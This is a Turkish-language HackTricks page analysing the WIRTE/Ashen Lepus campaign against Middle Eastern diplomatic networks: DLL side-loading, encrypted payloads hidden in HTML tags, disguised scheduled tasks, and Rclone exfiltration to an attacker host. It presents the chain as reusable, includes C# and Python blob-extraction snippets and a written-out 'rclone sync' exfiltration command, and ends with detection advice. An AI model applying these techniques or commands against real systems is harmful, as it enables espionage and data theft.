# Gelişmiş DLL Side-Loading ile HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Uygulama Özeti

Ashen Lepus (aka WIRTE), DLL sideloading, aşamalı HTML payload'ları ve modüler .NET backdoor'ları zincirleyerek Orta Doğu diplomatik ağlarında kalıcı hale gelen tekrar kullanılabilir bir kalıp kullanıma sundu. Teknik, aşağıdakilere dayandığı için herhangi bir operatör tarafından tekrar kullanılabilir:

- **Archive-based social engineering**: zararsız görünen PDF'ler hedefleri bir dosya paylaşım sitesinden bir RAR arşivi indirmeye yönlendirir. Arşiv, gerçek görünümlü bir document viewer EXE'si, güvenilir bir kütüphaneyi çağrıştıran adla kötü amaçlı bir DLL (ör. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) ve bir decoy `Document.pdf` içerir.
- **DLL search order abuse**: kurban EXE'ye çift tıklar, Windows DLL import'unu geçerli dizinden çözer ve kötü amaçlı loader (AshenLoader) güvenilir süreç içinde çalışır; decoy PDF açılarak şüphe azaltılır.
- **Living-off-the-land staging**: sonraki her aşama (AshenStager → AshenOrchestrator → modüller) ihtiyaç olana kadar diske yazılmaz, bunun yerine zararsız görünen HTML yanıtlarının içine gizlenmiş şifreli blob'lar olarak teslim edilir.

## Çok Aşamalı Side-Loading Zinciri

1. **Decoy EXE → AshenLoader**: EXE, AshenLoader'ı side-load eder; bu loader host keşfi yapar, AES-CTR ile şifreler ve `token=`, `id=`, `q=` veya `auth=` gibi dönen parametreler içinde POST ederek API-benzeri yollarına (ör. `/api/v2/account`) gönderir.
2. **HTML extraction**: C2 sadece istemci IP'si hedef bölgeye geolokasyona denk geldiğinde ve `User-Agent` implant ile eşleştiğinde bir sonraki aşamayı ifşa eder; bu sandbox'ları engeller. Kontroller geçildiğinde HTTP gövdesi `<headerp>...</headerp>` içinde Base64/AES-CTR ile şifrelenmiş AshenStager yükünü içerir.
3. **Second sideload**: AshenStager, `wtsapi32.dll` import eden başka bir meşru ikili ile dağıtılır. İkiliye enjekte edilen kötü amaçlı kopya daha fazla HTML çekerek bu sefer `<article>...</article>` kısmını oyup AshenOrchestrator'ı kurtarır.
4. **AshenOrchestrator**: Base64 JSON konfigürasyonunu çözen modüler bir .NET kontrolördür. Konfigürasyonun `tg` ve `au` alanları birleştirilip hash'lenerek AES anahtarını oluşturur ve `xrk`'ı deşifre eder. Ortaya çıkan byte'lar sonrasında fetch edilen her modül blob'u için bir XOR anahtarı görevi görür.
5. **Module delivery**: her modül, parser'ı başka bir etikete yönlendiren HTML yorumlarıyla (HTML comments) tanımlanır; bu, sadece `<headerp>` veya `<article>` arayan statik kuralları kırar. Modüller persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), ekran yakalama (`SCT`) ve dosya keşfi (`FE`) gibi işlevleri içerir.

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Savunucular belirli bir öğeyi engelleseler veya kaldırsalar bile, operatör teslimata devam etmek için HTML yorumunda işaret edilen etiketi değiştirmesi yeterlidir.

### Hızlı Çıkarma Yardımcısı (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Paralellikleri

Son HTML smuggling araştırması (Talos), HTML eklerindeki `<script>` blokları içinde Base64 dizeleri olarak gizlenen ve çalışma zamanında JavaScript ile çözülen payloads'ı öne çıkarıyor. Aynı numara C2 yanıtları için de tekrar kullanılabilir: şifreli blob'ları bir script etiketinin (veya başka bir DOM elemanının) içine stage edip AES/XOR'dan önce bellekte çözüp sayfayı normal bir HTML gibi gösterir. Talos, ayrıca script etiketleri içinde katmanlı obfuscation (identifier yeniden adlandırma artı Base64/Caesar/AES) gösteriyor; bu, HTML-staged C2 blob'larına düzgün şekilde karşılık geliyor.

## Recent Variant Notes (2024-2025)

- Check Point, 2024'te arşiv tabanlı sideloading'e dayanan ancak ilk aşama olarak `propsys.dll` (stagerx64) kullanan WIRTE kampanyalarını gözlemledi. Stager, sonraki payload'u Base64 + XOR (anahtar `53`) ile çözüyor, sabitlenmiş bir `User-Agent` ile HTTP istekleri gönderiyor ve HTML etiketleri arasına gömülmüş şifreli blob'ları çıkartıyordu. Bir dalda, stage uzun bir gömülü IP dizeleri listesi olarak `RtlIpv4StringToAddressA` ile çözüldükten sonra birleştirilerek payload byte'ları yeniden oluşturuldu.
- OWN-CERT, daha önce WIRTE araç setini belgelendirdi; burada side-loaded `wtsapi32.dll` dropper'ı string'leri Base64 + TEA ile koruyor ve decryption anahtarını DLL adının kendisinden (ör. `wtsapi32.dll`) türetiyor, ardından host tanımlama verisini XOR/Base64 ile obfuscate edip C2'ye gönderiyordu.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: güncel loader'lar 256-bit anahtarları ve nonce'ları (ör. `{9a 20 51 98 ...}`) gömüyor ve opsiyonel olarak decryption öncesi/sonrası `msasn1.dll` gibi string'leri kullanarak bir XOR katmanı ekliyor.
- **Key material variations**: önceki loader'lar gömülü string'leri korumak için Base64 + TEA kullandı; decryption anahtarı ise kötü amaçlı DLL adından (ör. `wtsapi32.dll`) türetiliyordu.
- **Infrastructure split + subdomain camouflage**: staging sunucuları araç başına ayrılıyor, farklı ASN'lerde barındırılıyor ve bazen meşru görünen alt alan adlarıyla maskeleniyor; böylece bir aşama ele geçirilse bile geri kalan açığa çıkmıyor.
- **Recon smuggling**: enumerate edilen veriler artık yüksek-değerli uygulamaları tespit etmek için Program Files listelerini içeriyor ve host'tan çıkmadan önce her zaman şifreleniyor.
- **URI churn**: query parametreleri ve REST yolları kampanyalar arasında değişiyor (`/api/v1/account?token=` → `/api/v2/account?auth=`), kırılgan tespitleri geçersiz kılıyor.
- **User-Agent pinning + safe redirects**: C2 altyapısı yalnızca tam UA string'lerine yanıt veriyor; aksi takdirde meşru görünen haber/sağlık sitelerine yönlendiriyor.
- **Gated delivery**: sunucular coğrafi engelleme uyguluyor ve sadece gerçek implantlara payload döndürüyor. Yetkisiz istemciler sıradan HTML alıyor.

## Persistence & Execution Loop

AshenStager, Windows bakım işleri gibi görünen ve `svchost.exe` üzerinden çalışan scheduled task'ler bırakıyor; örneğin:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Bu task'ler sideloading zincirini boot veya periyodik aralıklarla yeniden başlatarak AshenOrchestrator'ın diskle tekrar temas etmeden yeni modüller istemesini sağlıyor.

## Using Benign Sync Clients for Exfiltration

Operatörler, diplomatik belgeleri özel bir modül aracılığıyla `C:\Users\Public` içine (herkese okunur ve şüphe çekmeyen) stage ediyor, sonra bu dizini saldırgan depolamasıyla senkronize etmek için meşru [Rclone](https://rclone.org/) ikilisini indiriyorlar. Unit42, bu aktörün Rclone'u exfiltration için ilk kez kullandığını not ediyor; bu, meşru sync araçlarının normal trafik içinde karışmak için suistimal edilmesi eğilimiyle uyumlu:

1. **Stage**: hedef dosyaları `C:\Users\Public\{campaign}\` içine kopyala/topla.
2. **Configure**: saldırgan kontrollü HTTPS uç noktasına (örn. `api.technology-system[.]com`) işaret eden bir Rclone config gönder.
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` çalıştır, böylece trafik normal bulut yedeklemelerine benzer.

Rclone yaygın olarak meşru yedekleme iş akışları için kullanıldığı için savunucular yeni ikililer, tuhaf remote'lar veya `C:\Users\Public`'in ani senkronizasyonu gibi anormal yürütmelere odaklanmalı.

## Detection Pivots

- Kullanıcı yazılabilir yollarından beklenmedik şekilde DLL yükleyen **signed processes** için alarm verin (Procmon filtreleri + `Get-ProcessMitigation -Module`), özellikle DLL isimleri `netutils`, `srvcli`, `dwampi` veya `wtsapi32` ile örtüşüyorsa.
- Şüpheli HTTPS cevaplarını, **alışılmadık etiketler içinde gömülü büyük Base64 blob'ları** veya `<!-- TAG: <xyz> -->` yorumlarıyla korunmuş içerikler açısından inceleyin.
- HTML avını `<script>` blokları içindeki **Base64 string'ler** (HTML smuggling tarzı staging) ve JavaScript ile AES/XOR'dan önce çözülen içerikler için genişletin.
- `svchost.exe`'yi servis dışı argümanlarla çalıştıran veya dropper dizinlerine işaret eden **scheduled task**'leri arayın.
- Yalnızca tam `User-Agent` string'lerine payload dönen ve aksi halde meşru haber/sağlık domain'lerine yönlendiren **C2 redirect**'lerini takip edin.
- IT tarafından yönetilmeyen konumlarda ortaya çıkan **Rclone** ikililerini, yeni `rclone.conf` dosyalarını veya `C:\Users\Public` gibi staging dizinlerinden çekim yapan sync job'larını izleyin.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
